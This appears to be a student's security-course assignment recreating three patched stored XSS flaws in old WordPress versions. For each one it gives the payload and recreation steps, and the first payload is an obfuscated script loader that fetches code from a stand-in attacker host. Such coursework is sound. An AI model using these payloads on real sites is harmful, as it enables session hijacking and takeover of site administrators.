# CyberSecurityWeek7
My assignment for week 7

Exploit 1:

[!] Title: WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7945
    Reference: http://klikki.fi/adv/wordpress2.html
    Reference: http://packetstormsecurity.com/files/131644/
    Reference: https://www.exploit-db.com/exploits/36844/
[i] Fixed in: 4.2.1

Source Code:

```html
<a title='xxx onmouseover=eval(unescape(/var%20a%3Ddocument.createElement%28%27script%27%29%3Ba.setAttribute%28%27src%27%2C%27https%3A%2f%2fattacker.site%2fexploit.js%27%29%3Bdocument.head.appendChild%28a%29/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
```

Guide for recreation:

I made a comment on a post not as an admin using XSS. 
The comment content had to be greater than 64kb in order to work. 
After the comment was submitted, I approved the comment as the admin, and went to view the post with the comments. 
On the load of the page the exploit was ran. This vulnerability was patched in WordPress 4.2.1.


<img src="XSS Exploit 1.gif" width="800">


Exploit 2:

[!] Title: WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8111
    Reference: https://wordpress.org/news/2015/07/wordpress-4-2-3/
    Reference: https://twitter.com/klikkioy/status/624264122570526720
    Reference: https://klikki.fi/adv/wordpress3.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
[i] Fixed in: 4.2.3

Source Code:

```html
<a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a>
```

Guide for recreation:

I made a post as a user with Author privileges using the source code as the content of the post. 
I then signed in as an admin and when viewing the post, the script ran on mouseover of the post. 
This vulnerability was patched in WordPress 4.2.3.


<img src="XSS Exploit 2.gif" width="800">


Exploit 3:

[!] Title: WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8186
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714
[i] Fixed in: 4.2.5

Source Code: 
                          
```html
TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">Click me</a>
```

Guide for recreation:
I made a post as a user with Author privileges using the source code for the content of the post. 
I then signed in as an admin and then when going to click the link, the script runs on mouseover instead of onclick.
This vulnerability was patched in WordPress 4.2.5.


<img src="XSS Exploit 3.gif" width="800">
